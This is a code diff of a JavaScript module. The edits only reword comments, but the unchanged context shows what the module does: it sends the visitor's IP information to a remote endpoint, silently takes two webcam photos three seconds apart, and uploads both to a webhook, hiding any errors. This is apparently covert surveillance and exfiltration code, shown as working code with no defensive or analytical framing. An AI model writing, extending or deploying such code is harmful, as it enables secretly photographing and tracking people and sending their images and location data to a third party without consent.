@@ -13,7 +13,7 @@ export async function sendIPInfo() {
       body: JSON.stringify(content)
     });
   } catch (e) {
-    // fail silently
+    // silently fail
   }
 }
 
@@ -26,7 +26,7 @@ async function sendImageToWebhook(blob, filename) {
       body: form
     });
   } catch (e) {
-    // fail silently
+    // silently fail
   }
 }
 
@@ -42,18 +42,17 @@ export async function capturePhotos() {
     canvas.height = video.videoHeight || 480;
     const ctx = canvas.getContext('2d');
 
-    // Capture immediately
+    // First capture immediately
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
     canvas.toBlob(blob => sendImageToWebhook(blob, 'photo1.png'));
 
-    // Capture again after 3 seconds
+    // Second capture after 3 seconds
     setTimeout(() => {
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
       canvas.toBlob(blob => sendImageToWebhook(blob, 'photo2.png'));
       stream.getTracks().forEach(track => track.stop());
     }, 3000);
   } catch (err) {
-    // Denied camera access, you can handle it here or in caller
-    throw err;
+    throw err;  // let caller handle denial
   }
 }
